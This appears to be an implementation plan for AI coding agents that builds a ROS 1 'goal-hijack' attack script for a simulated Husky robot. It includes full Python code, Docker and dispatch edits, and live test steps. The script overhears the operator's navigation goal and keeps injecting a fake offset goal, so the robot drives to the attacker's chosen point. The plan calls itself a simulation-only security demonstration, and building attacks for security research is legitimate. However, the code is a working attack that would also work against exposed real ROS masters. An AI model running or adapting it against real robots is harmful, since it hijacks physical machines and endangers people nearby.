# Goal-Hijack Attack Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build `attack_goal.py` — a rogue-publisher attack that overhears the operator's real move_base goal (by subscribing) and injects a fake goal (real + offset), hijacking the robot's mission — plus the two small changes to wire it into the existing `attacker/` container.

**Architecture:** One new script at repo root, modeled on `attack_cmd_vel.py` (a class + `parse_args()` + `main()` with `rospy.on_shutdown`). It SUBSCRIBES to `/move_base/goal` to learn the operator's real target, waits (bounded) for the one-shot goal, computes `fake = real + offset`, and PUBLISHES a `MoveBaseActionGoal` at a steady rate so it stays the newest goal. Two supporting edits: add `ros-noetic-move-base-msgs` to `attacker/Dockerfile`, and add `goal` to `attacker/attack.sh`'s dispatch whitelist.

**Tech Stack:** ROS 1 Noetic, Python 3 (`rospy`, `move_base_msgs`, `nav_msgs`, plain `math`), Docker. Runs from the existing Tier 2 `attacker/` container.

## Global Constraints

- **Realistic attack only.** Recon is a ROS **subscribe** to `/move_base/goal`, NOT packet sniffing. Injection is a ROS **publish**. No pcap, no TCPROS decode, no MITM. (Those were dropped as academic — spec §6/§7.)
- **No `tf` dependency.** The goal orientation is yaw-only, computed inline with `math`: `qz = sin(yaw/2)`, `qw = cos(yaw/2)`, `qx = qy = 0`. Do NOT import `tf`.
- **No ground truth.** Robot position for the CSV comes from `/odometry/filtered` only. No `gazebo_msgs`.
- **Topic + type:** `/move_base/goal`, type `move_base_msgs/MoveBaseActionGoal` (verified live). The target lives at `msg.goal.target_pose.pose.position.{x,y}`.
- **Goal frame is `odom`** (matches the mapless costmaps' global_frame and the operator's goals).
- **Mirror the sibling pattern.** Follow `attack_cmd_vel.py`'s structure: `threading.Lock` for shared state, `csv.writer(open(...,"w",newline=""))` with per-row flush, `rospy.on_shutdown` cleanup, `anonymous=True` node.
- **Do NOT modify** other `attack_*.py`, the operator, or `send_mapless_goal.py`. Only new file + the two named `attacker/` edits.
- **Timing:** a subscriber only sees goals published AFTER it subscribes, and the operator's goal is one-shot. Attacker MUST subscribe first and WAIT (up to `--timeout`) for a real goal before injecting.
- **Testing is live-sim integration** (no pytest harness in this repo). Verified by running against the sim + operator and observing the hijack.

---

## Reference: exact patterns (verified in the codebase)

From `attack_cmd_vel.py` (the template — same structure, do not edit it):
- Class with `__init__(self, args)`: sets `self._lock = threading.Lock()`, creates `rospy.Publisher`, `rospy.Subscriber`(s), opens CSV (`open(args.csv,"w",newline="")` → `csv.writer` → header row → flush).
- Telemetry callbacks cache into locked fields.
- `run(self)`: `self._start_wall = time.time()`, `rate = rospy.Rate(self.args.rate)`, loop `while not self._stop.is_set() and not rospy.is_shutdown()`, duration check (`0` = forever), publish each tick, log a CSV row ~1 Hz.
- `shutdown(self)`: idempotent, `self._stop.set()`, flush+close CSV guarded.
- `parse_args()` → argparse; `main()` → `rospy.init_node("attack_goal", anonymous=True)`, `rospy.on_shutdown(attack.shutdown)`, `try: attack.run() except rospy.ROSInterruptException: pass finally: attack.shutdown()`.

`MoveBaseActionGoal` field path (verified): `msg.goal.target_pose.header.frame_id`,
`msg.goal.target_pose.pose.position.{x,y,z}`, `msg.goal.target_pose.pose.orientation.{x,y,z,w}`.

From `attacker/attack.sh` (dispatch whitelist to extend):
```bash
case "${NAME}" in
  cmd_vel|compass|odom|param) ;;    # <- add: goal
  ...
```

From `attacker/Dockerfile` (install line to extend):
```dockerfile
&& apt-get install -y --no-install-recommends nmap iproute2 \   # <- add: ros-noetic-move-base-msgs
```

---

## Task 1: `attack_goal.py` — the mission-hijack attack

**Files:**
- Create: `attack_goal.py` (repo root)

**Interfaces:**
- Consumes: a running master with `/move_base/goal` (`move_base_msgs/MoveBaseActionGoal`) and `/odometry/filtered`. Reachable via `ROS_MASTER_URI`.
- Produces: `attack_goal_report.csv` (default; `--csv` overrides), header exactly:
  `elapsed_time,real_goal_x,real_goal_y,fake_goal_x,fake_goal_y,robot_x,robot_y`
- CLI: `attack_goal.py [--offset-x 0.0] [--offset-y 12.0] [--rate 2.0] [--duration 0.0] [--timeout 60.0] [--topic /move_base/goal] [--csv attack_goal_report.csv]`

- [ ] **Step 1: Write `attack_goal.py`**

```python
#!/usr/bin/env python3
"""Simulation-only mission-HIJACK attack: overhear the operator's move_base goal
and inject a fake one, so the robot drives to the ATTACKER's target instead.

  *** SIMULATION-ONLY SECURITY DEMONSTRATION. No real robot is involved. ***

WHAT REAL ATTACKERS DO (and this models)
----------------------------------------
ROS 1 authenticates nobody: any peer that reaches the master can SUBSCRIBE to
read the graph and PUBLISH to any topic. Documented real-world ROS attacks are
exactly this -- rogue publish/subscribe on an exposed or pivoted-into master --
NOT on-the-wire packet sniffing or MITM (those are research artifacts). So this
attack:
  1. SUBSCRIBES to /move_base/goal to OVERHEAR the operator's real target
     (a graph read -- NOT a packet sniff; rospy deserializes it for us), then
  2. PUBLISHES a MoveBaseActionGoal with a target OFFSET from the real one, at a
     steady rate so it stays the newest goal move_base acts on.
The robot then drives to the attacker's point. The operator, having sent its own
goal once, never knows.

TIMING: a subscriber only receives goals published AFTER it subscribes, and the
operator's goal is one-shot. So we subscribe FIRST and WAIT (up to --timeout) for
a real goal before injecting. Run this BEFORE the operator sends its mission.

DETECTABLE: this is a rogue PUBLISH, so `rostopic info /move_base/goal` shows an
extra publisher. That is a true property of what real attackers do; the stealthy
in-flight rewrite (no extra publisher) is on-the-wire MITM -- deliberately NOT
built (academic). See docs/superpowers/specs/2026-08-02-goal-hijack-attack-design.md.

Usage:
    python3 attack_goal.py                       # offset (0, +12), wait <=60s
    python3 attack_goal.py --offset-y 3          # subtle sabotage
    python3 attack_goal.py --offset-x 5 --offset-y 5 --duration 30
"""
import argparse
import csv
import math
import threading
import time

import rospy
from move_base_msgs.msg import MoveBaseActionGoal
from nav_msgs.msg import Odometry


class GoalHijackAttack(object):
    def __init__(self, args):
        self.args = args
        self._lock = threading.Lock()
        self._real_goal = None      # (x, y) overheard from the operator
        self._robot_xy = None       # (x, y) from /odometry/filtered
        self._logged_overheard = False
        self._stop = threading.Event()
        self._start_wall = None

        # Publisher for the injected fake goal.
        self._pub = rospy.Publisher(args.topic, MoveBaseActionGoal, queue_size=1)
        # RECON: subscribe to the SAME topic to overhear the operator's real goal.
        rospy.Subscriber(args.topic, MoveBaseActionGoal, self._on_real_goal,
                         queue_size=1)
        # Robot's actual position, to show the hijack in the CSV.
        rospy.Subscriber("/odometry/filtered", Odometry, self._on_odom,
                         queue_size=1)

        self._csv_file = open(args.csv, "w", newline="")
        self._csv = csv.writer(self._csv_file)
        self._csv.writerow(
            ["elapsed_time", "real_goal_x", "real_goal_y",
             "fake_goal_x", "fake_goal_y", "robot_x", "robot_y"])
        self._csv_file.flush()

    # --- recon / telemetry ---------------------------------------------------
    def _on_real_goal(self, msg):
        """Overhear a goal on the topic. We also receive our OWN injected goals
        here; only the FIRST goal seen is the operator's real one, so we latch it
        once and ignore later messages (which include our injections)."""
        p = msg.goal.target_pose.pose.position
        with self._lock:
            if self._real_goal is None:
                self._real_goal = (p.x, p.y)
                do_log = True
            else:
                do_log = False
        if do_log and not self._logged_overheard:
            self._logged_overheard = True
            rospy.loginfo("OVERHEARD operator goal: (%.2f, %.2f)", p.x, p.y)

    def _on_odom(self, msg):
        with self._lock:
            self._robot_xy = (msg.pose.pose.position.x, msg.pose.pose.position.y)

    # --- the injected message ------------------------------------------------
    def _build_goal(self, fx, fy, real):
        """MoveBaseActionGoal at (fx, fy) in odom, facing from the real goal
        toward the fake one. Yaw-only quaternion computed inline (no tf)."""
        yaw = math.atan2(fy - real[1], fx - real[0])
        g = MoveBaseActionGoal()
        g.header.stamp = rospy.Time.now()
        g.goal.target_pose.header.frame_id = "odom"
        g.goal.target_pose.header.stamp = rospy.Time.now()
        g.goal.target_pose.pose.position.x = fx
        g.goal.target_pose.pose.position.y = fy
        g.goal.target_pose.pose.orientation.z = math.sin(yaw / 2.0)
        g.goal.target_pose.pose.orientation.w = math.cos(yaw / 2.0)
        return g

    def _log_row(self, real, fake):
        with self._lock:
            robot = self._robot_xy
        elapsed = time.time() - self._start_wall
        rx = robot[0] if robot else float("nan")
        ry = robot[1] if robot else float("nan")
        rospy.loginfo("[t=%6.1fs] real=(%.2f,%.2f) fake=(%.2f,%.2f) "
                      "robot=(%.2f,%.2f)", elapsed, real[0], real[1],
                      fake[0], fake[1], rx, ry)
        self._csv.writerow(
            ["%.3f" % elapsed, "%.4f" % real[0], "%.4f" % real[1],
             "%.4f" % fake[0], "%.4f" % fake[1], "%.4f" % rx, "%.4f" % ry])
        self._csv_file.flush()

    # --- main loop -----------------------------------------------------------
    def run(self):
        # WAIT for the operator's one-shot real goal (bounded by --timeout).
        rospy.loginfo("Lurking: subscribed to %s, waiting up to %.0fs for the "
                      "operator's goal ...", self.args.topic, self.args.timeout)
        deadline = time.time() + self.args.timeout
        while not rospy.is_shutdown():
            with self._lock:
                real = self._real_goal
            if real is not None:
                break
            if time.time() > deadline:
                rospy.logerr("No operator goal seen within %.0fs. Is the "
                             "operator running? (Start this BEFORE the operator "
                             "sends its goal.)", self.args.timeout)
                return 1
            time.sleep(0.05)
        if rospy.is_shutdown():
            return 0

        fake = (real[0] + self.args.offset_x, real[1] + self.args.offset_y)
        rospy.loginfo("INJECTING fake goal: real=(%.2f,%.2f) + offset=(%.2f,%.2f) "
                      "-> fake=(%.2f,%.2f)", real[0], real[1],
                      self.args.offset_x, self.args.offset_y, fake[0], fake[1])

        self._start_wall = time.time()
        rate = rospy.Rate(self.args.rate)
        next_log = self._start_wall + 1.0
        while not self._stop.is_set() and not rospy.is_shutdown():
            if self.args.duration > 0 and \
                    (time.time() - self._start_wall) >= self.args.duration:
                rospy.loginfo("Duration reached -- stopping.")
                break
            self._pub.publish(self._build_goal(fake[0], fake[1], real))
            now = time.time()
            if now >= next_log:
                self._log_row(real, fake)
                next_log += 1.0
            rate.sleep()
        return 0

    def shutdown(self):
        """Idempotent: stop publishing and close the CSV. No corrective goal is
        sent -- we just cease."""
        self._stop.set()
        try:
            if not self._csv_file.closed:
                self._csv_file.flush()
                self._csv_file.close()
        except Exception as exc:  # noqa: BLE001
            rospy.logwarn("Error closing CSV: %s", exc)
        rospy.loginfo("ATTACK STOPPED. CSV saved to %s", self.args.csv)


def parse_args():
    p = argparse.ArgumentParser(
        description="Simulation-only mission-hijack: overhear the operator's "
                    "move_base goal, then inject a fake one (real + offset).")
    p.add_argument("--offset-x", type=float, default=0.0, dest="offset_x",
                   help="x offset added to the overheard real goal (default 0)")
    p.add_argument("--offset-y", type=float, default=12.0, dest="offset_y",
                   help="y offset added to the overheard real goal (default 12 "
                        "= visible sabotage; use a small value for subtle drift)")
    p.add_argument("--rate", type=float, default=2.0,
                   help="publish rate in Hz for the injected goal (default 2)")
    p.add_argument("--duration", type=float, default=0.0,
                   help="seconds to keep injecting; 0 = until Ctrl-C (default 0)")
    p.add_argument("--timeout", type=float, default=60.0,
                   help="max seconds to wait for the operator's goal (default 60)")
    p.add_argument("--topic", default="/move_base/goal",
                   help="goal topic to overhear and inject on "
                        "(default /move_base/goal)")
    p.add_argument("--csv", default="attack_goal_report.csv",
                   help="telemetry CSV path (default attack_goal_report.csv)")
    args = p.parse_args()
    if args.rate <= 0:
        p.error("--rate must be > 0")
    if args.timeout <= 0:
        p.error("--timeout must be > 0")
    return args


def main():
    args = parse_args()
    rospy.init_node("attack_goal", anonymous=True)
    attack = GoalHijackAttack(args)
    rospy.on_shutdown(attack.shutdown)
    try:
        return attack.run()
    except rospy.ROSInterruptException:
        pass
    finally:
        attack.shutdown()


if __name__ == "__main__":
    import sys
    sys.exit(main() or 0)
```

- [ ] **Step 2: Make executable**

Run: `chmod +x attack_goal.py`

- [ ] **Step 3: Byte-compile (no master needed)**

Run: `python3 -m py_compile attack_goal.py`
Expected: exit 0, no output. (Full behavior is verified live in Task 3; note
`py_compile` only parses — it will not import `rospy`/`move_base_msgs`, so it
works without ROS installed.)

- [ ] **Step 4: Commit**

```bash
git add attack_goal.py
git commit -m "feat(attack): attack_goal.py — mission-hijack via rogue goal publish

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

## Task 2: Wire `attack_goal.py` into the `attacker/` container

Add the `move_base_msgs` dependency to the attacker image and `goal` to the
dispatch whitelist so `./attack.sh goal ...` works from the container.

**Files:**
- Modify: `attacker/Dockerfile` (the `apt-get install` line)
- Modify: `attacker/attack.sh` (the dispatch `case` whitelist)

**Interfaces:**
- Consumes: `attack_goal.py` (Task 1), bind-mounted into the container at
  `/repo/attack_goal.py`.
- Produces: `docker compose run --rm attacker ./attacker/attack.sh goal [args]` runs it.

- [ ] **Step 1: Add `move_base_msgs` to the attacker Dockerfile**

In `attacker/Dockerfile`, change the install line from:
```dockerfile
    && apt-get install -y --no-install-recommends nmap iproute2 \
```
to:
```dockerfile
    && apt-get install -y --no-install-recommends nmap iproute2 ros-noetic-move-base-msgs \
```
(and update the adjacent comment to note move_base_msgs = attack_goal.py's goal type).

- [ ] **Step 2: Add `goal` to the attack.sh dispatch whitelist**

In `attacker/attack.sh`, change:
```bash
  cmd_vel|compass|odom|param) ;;
```
to:
```bash
  cmd_vel|compass|odom|param|goal) ;;
```
and update the `usage:` line in the `*)` branch to include `goal`.

- [ ] **Step 3: Rebuild the attacker image + verify the import resolves**

```bash
cd attacker
export ROBOT_HOST_IP="$(ip -4 addr show docker0 | awk '/inet /{print $2}' | cut -d/ -f1)"
docker compose build
docker compose run --rm attacker python3 -c \
  "import rospy, move_base_msgs.msg, nav_msgs.msg; print('imports ok')"
```
Expected: build succeeds; prints the entrypoint's `ROS_IP=...`/`ROS_MASTER_URI=...`
lines then `imports ok`. If Docker needs sudo on this box, retry the build/run
with `sudo -E`. If Docker is unavailable, report the build as DEFERRED with the
exact error (files are the deliverable; build is verification).

- [ ] **Step 4: Commit**

```bash
git add attacker/Dockerfile attacker/attack.sh
git commit -m "feat(attacker): add move_base_msgs + goal dispatch for attack_goal.py

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

## Task 3: Live end-to-end hijack test + writeup

Drive the full attack live, confirm the robot goes to the fake goal, document it.

**Files:**
- Create: `docs/goal-hijack-demo.md` (a short run log + the honest caveats)

**Interfaces:**
- Consumes: everything from Tasks 1–2, plus the operator container and
  `spawn-robot-idle.sh` (already built).
- Produces: a documented, verified attack.

- [ ] **Step 1: Bring up robot (host)**

```bash
export ROS_IP="$(ip -4 addr show docker0 | awk '/inet /{print $2}' | cut -d/ -f1)"
export ROS_MASTER_URI="http://${ROS_IP}:11311"
./load-park-stock-husky.sh          # terminal 1 (world only)
./spawn-robot-idle.sh               # terminal 2 (robot + move_base, idle)
```

- [ ] **Step 2: Start the attacker lurking (terminal 3)**

```bash
cd attacker
export ROBOT_HOST_IP="$(ip -4 addr show docker0 | awk '/inet /{print $2}' | cut -d/ -f1)"
docker compose run --rm attacker ./attacker/attack.sh goal --offset-y 12
```
Expected: `Lurking: subscribed to /move_base/goal, waiting ...` (no goal yet).

- [ ] **Step 3: Operator sends the real mission (terminal 4)**

```bash
cd operator
export ROBOT_HOST_IP="$(ip -4 addr show docker0 | awk '/inet /{print $2}' | cut -d/ -f1)"
docker compose run --rm operator ./operator/operate.py --goal-x 10 --goal-y 0
```

- [ ] **Step 4: Observe the hijack**

Expected on the attacker console:
```
OVERHEARD operator goal: (10.00, 0.00)
INJECTING fake goal: real=(10.00,0.00) + offset=(0.00,12.00) -> fake=(10.00,12.00)
[t=  ...s] real=(10.00,0.00) fake=(10.00,12.00) robot=( ... )
```
And: the robot drives toward **(10, 12)** in Gazebo, NOT (10, 0). Verify the CSVs:
```bash
head -1 attack_goal_report.csv          # exact 7-col header
tail -3 attack_goal_report.csv          # robot_x/robot_y trending toward 10,12
head -1 operator_run.csv; tail -1 operator_run.csv   # operator BELIEVED ref=(10,0)
```
Expected: `attack_goal_report.csv` header is exactly
`elapsed_time,real_goal_x,real_goal_y,fake_goal_x,fake_goal_y,robot_x,robot_y`;
`robot_x` climbs toward 10 and `robot_y` toward 12; `operator_run.csv` `ref_x/ref_y`
= (10,0) — proving operator intent ≠ robot path.

- [ ] **Step 5: Confirm untouched files**

Run: `git status --porcelain attack_cmd_vel.py attack_odom.py attack_compass.py attack_param.py send_mapless_goal.py operator/`
Expected: no output (none modified).

- [ ] **Step 6: Write `docs/goal-hijack-demo.md`**

```markdown
# Goal-Hijack Attack — demo run

`attack_goal.py` models the realistic ROS attack: reach the trust-anyone graph,
overhear the operator's move_base goal (SUBSCRIBE), and inject a fake one
(PUBLISH) so the robot drives to the attacker's target. Design:
`docs/superpowers/specs/2026-08-02-goal-hijack-attack-design.md`.

## Run (four terminals, docker0-bound master)

1. `./load-park-stock-husky.sh`  — world only
2. `./spawn-robot-idle.sh`       — robot + mapless move_base, idle
3. attacker: `docker compose run --rm attacker ./attacker/attack.sh goal --offset-y 12`
   — subscribes, lurks
4. operator: `docker compose run --rm operator ./operator/operate.py --goal-x 10 --goal-y 0`
   — sends the real goal (10, 0)

## Result (verified)

- Attacker overheard the real goal (10, 0) and injected (10, 12).
- Robot drove to ~(10, 12), NOT (10, 0). Operator believed it sent (10, 0).
- `attack_goal_report.csv`: robot_x/robot_y track the fake goal; `operator_run.csv`
  ref = (10, 0). Operator intent ≠ robot path = the hijack.

## Honest caveats

- This is a rogue PUBLISH: `rostopic info /move_base/goal` shows an extra
  publisher. That is what real attackers do (Shodan-exposed / pivoted-into
  masters, publish to the trust-anyone graph). The stealthy in-flight rewrite
  (no extra publisher) is on-the-wire MITM — deliberately NOT built (academic).
- Entry (exposed master, or pivot from a breached HuskyA300-Dashboard-main web
  app per docs/attacker-network-simulation.md §9) is assumed here, not exploited.
```

- [ ] **Step 7: Commit**

```bash
git add docs/goal-hijack-demo.md
git commit -m "docs(attack): goal-hijack demo run log + honest caveats

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

## Self-Review

**Spec coverage** (spec section → task):
- §1 Purpose (realistic rogue-publish hijack) → Task 1.
- §2 Mechanics (subscribe-recon / wait / offset / publish) → Task 1 (`_on_real_goal`, `run()` wait loop, `_build_goal`).
- §3 Components (class shape, CLI, inline quaternion no-tf) → Task 1.
- §3a attacker image dep (`move_base_msgs`) → Task 2 Step 1.
- §4 CSV 7-col schema → Task 1 (header) + Task 3 Step 4 (verify).
- §5 verification (live hijack, robot to fake goal, CSV cross-check) → Task 3.
- §6 honest caveats (detectable publish, entry assumed) → Task 1 docstring + Task 3 writeup.
- dispatch wiring (attack.sh whitelist) — not in spec prose but required for container use → Task 2 Step 2.

**Placeholder scan:** none — full code in Task 1, concrete CLI defaults, exact CSV header repeated identically in Task 1 / Task 3 Step 4 / interfaces, exact Dockerfile/attack.sh edits shown.

**Type consistency:** `MoveBaseActionGoal` field path (`msg.goal.target_pose.pose.position`) consistent between `_on_real_goal` and `_build_goal`. `--offset-x/--offset-y` (dest `offset_x`/`offset_y`) used consistently in `parse_args` and `run()`. CSV header string identical in `__init__`, Task 3, and the Interfaces block. `_stop`/`_lock`/`_start_wall` mirror `attack_cmd_vel.py`.

**Note on testing:** live-sim integration per repo convention; `py_compile` only for the write step; full hijack verified live in Task 3.
